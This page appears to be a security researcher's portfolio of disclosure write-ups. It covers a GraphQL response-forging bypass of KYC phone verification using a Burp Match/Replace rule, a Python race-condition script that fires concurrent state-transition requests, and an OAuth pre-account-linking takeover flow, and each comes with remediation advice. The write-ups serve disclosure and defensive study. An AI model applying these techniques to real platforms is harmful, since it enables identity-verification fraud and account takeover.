GraphQL Boolean State Injection → KYC / Phone Verification Bypass
Client-side routing trusts a forged verifyPhone: true response without any server-side nonce validation, allowing complete bypass of multi-step identity verification.
GraphQL Auth Bypass Client-Side Trust KYC Burp Match/Replace
Responsible Disclosure Pending ▾
⚠ Pending Disclosure — Target identity withheld pending vendor patch. Full PoC and HTTP evidence on file. This is a summary of the attack chain.
Vulnerability Summary

The target is a multi-tenant financial platform running KYC onboarding through a GraphQL API. The verifyPhone mutation returns a boolean that the client-side state manager (Apollo Client / Redux) uses to gate the next onboarding step. The backend issues no cryptographic session token to prove that verification actually succeeded — the gate lives entirely in frontend routing logic.

Step-by-Step Exploitation

  1. Start onboarding. Enter an arbitrary phone number. The platform dispatches a verifyPhone GraphQL mutation with a OTP token.

  2. In Burp Suite, set a Match & Replace rule scoped to the response from /graphql. Match the full error payload (shown below) and replace it with the forged success payload.

  3. Submit any random 6-digit OTP. The real server returns HTTP 200 with an error object — Burp intercepts it mid-stream.

  4. Burp's response replacement fires: the error JSON is swapped for {"data":{"verifyPhone":true}}. The tampered response reaches the browser.

  5. Apollo Client reads data.verifyPhone === true, updates its local cache, and the React router unlocks the next onboarding step. Phone is now "verified" without ever receiving a valid OTP.

Authentication State Race Condition — Concurrent Session Exploit
Multi-threaded concurrent requests during a narrow authentication window allow session state desynchronization, enabling privilege escalation under certain backend timing conditions.
Race Condition Session Logic Concurrency TOCTOU
Pending ▾
Research Context — Race condition identified during multi-tenant session analysis. The following documents the vulnerability class and PoC methodology.
Vulnerability Mechanism

Between an OTP/verification request and the server-side state commit, there is a finite window (typically 10–200ms) where the server has not yet locked the session record. Firing concurrent requests during this window can cause the backend to process two requests against the same pre-commit state — resulting in double-processing, state corruption, or privilege escalation.

Concurrent Request PoC
CONCURRENCY ENGINEPython · ThreadPoolExecutor
# Fire N concurrent state-transition requests in the same millisecond window
# Goal: backend processes two requests before either commits to DB

import requests, concurrent.futures, time

TARGET  = "https://api.target.com/graphql"
TOKEN   = "<session_token_at_pre-verification-state>"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
PAYLOAD = {"query": "mutation { triggerStateTransition(action: \"advance\") { status } }"}

def fire(thread_id):
    r = requests.post(TARGET, json=PAYLOAD, headers=HEADERS, timeout=5)
    print(f"[{thread_id}] {r.status_code}: {r.text[:120]}")

# All threads fire simultaneously — maximize overlap in the race window
barrier = [None]
def synchronized_fire(tid):
    while barrier[0] is None: pass
    fire(tid)

threads = []
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
    futs = [ex.submit(synchronized_fire, i) for i in range(10)]
    time.sleep(0.1)
    barrier[0] = True
    concurrent.futures.wait(futs)
Impact
  • State transition processed twice under race → privilege escalation
  • Potential double-credit / double-resource allocation
  • Session desync: frontend and backend in inconsistent states
Remediation
  • Atomic DB operations / row-level locking on state transitions
  • Idempotency keys per transition request
  • Backend validation: reject second request if state already advanced

Google OAuth flow allows an attacker to pre-link a victim's email to an attacker-controlled account via unvalidated identity federation, enabling silent account takeover when the victim later signs in with Google.
OAuth 2.0 Account Takeover Identity Federation Google Pre-Account Linking
medium.com/@rishuraj2666 ▾
Published Research — Full write-up at medium.com/@rishuraj2666 · "Breaking Google OAuth" (September 2026). Documented here as a condensed technical summary.
Vulnerability Class: OAuth Pre-Account Linking

Most applications that support both password-based login and "Sign in with Google" merge accounts by matching the verified email address from the Google ID token against existing accounts. The vulnerability arises when the application links accounts before verifying that the user initiating the link actually controls the Google account — or when it merges without validating the OAuth state parameter (CSRF protection).

An attacker who knows a victim's email can trigger the OAuth flow, intercept the code grant at the redirect step, and manipulate the linking request — associating the victim's email with the attacker's session. When the victim later signs in with Google, the application silently upgrades the attacker's session, handing over full account access.

Attack Flow

  1. Attacker initiates "Link Google Account" flow on the target app. App generates an authorization URL: accounts.google.com/o/oauth2/auth?client_id=…&redirect_uri=…&state=ATTACKER_STATE

  2. Attacker captures the OAuth code after Google redirects back (either via their own browser or by crafting a cross-site link). The state parameter is absent or not validated server-side.

  3. Attacker POSTs the code to the app's OAuth callback with the victim's email as the linking target. App exchanges code for an ID token, extracts the email, and links it to the attacker's account record.

  4. Victim visits the app and clicks "Sign in with Google" with their real Google account. App receives a valid ID token with victim's email → finds the pre-linked account (attacker's) → logs victim into attacker's session context.

Impact
  • Pre-account linking → victim silently logs into attacker's account
  • Full account takeover: attacker sees victim's history, payment methods, PII
  • No victim interaction required beyond normal Google sign-in
  • Scales to any user whose email the attacker knows
Remediation
  • Generate and validate a cryptographically random state parameter on every OAuth request (CSRF token, tied to session)
  • Only allow account linking when the user is already authenticated and the OAuth email matches the authenticated account
  • Never merge a new OAuth identity into an existing account without user confirmation step
  • Invalidate existing sessions after any identity federation change

Whitepaper

Technical write-up on the GraphQL state injection class — a structural pattern appearing across fintech and DeFi onboarding flows.

RESEARCH · MAY 2026 Responsible Disclosure Pending GraphQL · Authentication
Architectural Analysis of Response Manipulation & Client-Side State Injection in GraphQL-Based Authentication Gateways
Author: Rishuraj Singh · rishuraj2666.github.io · Bugcrowd / Intigriti / HackerOne
1 — Abstract

GraphQL has become the default API layer for fintech onboarding and KYC flows. Because GraphQL mutations return structured JSON that client-side state managers (Apollo, Redux) treat as ground truth, a single tampered boolean in an API response can silently bypass the entire verification chain. This paper documents the mechanism, demonstrates a repeatable exploit using Burp Suite's Match/Replace rule, and proposes a cryptographic remediation pattern.

2 — The Architectural Gap

In a well-designed multi-step verification flow, the server issues a signed state token after each successful step. Subsequent steps require that token — the server validates its signature before proceeding. The critical design error documented here: the target platform does not issue a state token. The server returns a boolean (verifyPhone: true), and the client router uses that boolean — and only that boolean — to decide whether to show the next step.

Root cause: Client-side state management (Apollo Client cache) is used as the single source of truth for authentication step completion. There is no server-side record that phone verification actually completed before the next mutation is processed.
3 — Exploitation
3.1 Normal Error Flow

An invalid OTP produces the following server response. Note: GraphQL servers commonly return HTTP 200 even for application-level errors — this is what makes response manipulation viable.

POST api-sandbox.target.com/graphql200 · error
// Request
{ "query": "mutation { verifyPhone(token: \"999999\") }" }

// Server response (unmodified)
{
  "errors": [{
    "message": "Validation Failed",
    "path":    ["verifyPhone"],
    "code":    400,
    "errors": { "token": [{ "code": "invalid" }] }
  }],
  "data": null
}
3.2 Burp Match/Replace Rule

Configure a response rule in Burp Suite Proxy → Options → Match and Replace. Scope: api-sandbox.target.com. Type: Response body. The rule fires on every response from the GraphQL endpoint:

BURP SUITE · Match & Replace
// MATCH (regex, response body):
\{.*?"errors".*?"data":\s*null\s*\}

// REPLACE WITH:
{"data":{"verifyPhone":true}}

4 — Impact Chain

The severity depends on whether the backend enforces verification state before processing the final KYC mutation. In the tested instance, the identity upload step and initial account funding were accessible post-bypass — the backend did not cross-check that verifyPhone had genuinely completed. This allows:

P1-Class Risk: Attacker accounts reach KYC identity submission without owning the phone number. In platforms where the phone number doubles as a 2FA factor or withdrawal confirmation, bypassing verification weakens the entire downstream security chain.

  • Fraudulent KYC submission: arbitrary phone number can be "verified" and tied to a real identity document.

  • Attack surface expansion: bypassing phone verification reveals deeper application layers, increasing exploit surface.

  • Frontend/backend state desync: when both are in inconsistent states, error traces and stack dumps may leak internal paths.

5 — Remediation

The fix requires moving verification state off the client and onto the server with a cryptographic token. Every subsequent step must validate this token server-side — no token, no access.

SECURE SCHEMA DESIGNGraphQL
type VerifyPhonePayload {
  success:              Boolean!
  stateVerificationToken: String!
  # Short-lived HMAC token: HMAC-SHA256(userID + step + timestamp, server_secret)
  # Expires: 15 minutes
  # Bound to: userID + step ("phone_verified")
}

# Every downstream mutation REQUIRES the token:
mutation SubmitKYC(
  $identityDoc:           Upload!
  $stateVerificationToken: String!   # ← mandatory, verified server-side
) { ... }

# Server validation (pseudocode):
# if not verify_hmac(token, user_id, "phone_verified", secret):
#     raise AuthorizationError("Phone verification not confirmed")
Additional hardening: Return HTTP 422 Unprocessable Entity (or 401) for validation failures instead of HTTP 200 with an error body. This prevents response manipulation from being trivially masked by the status code.
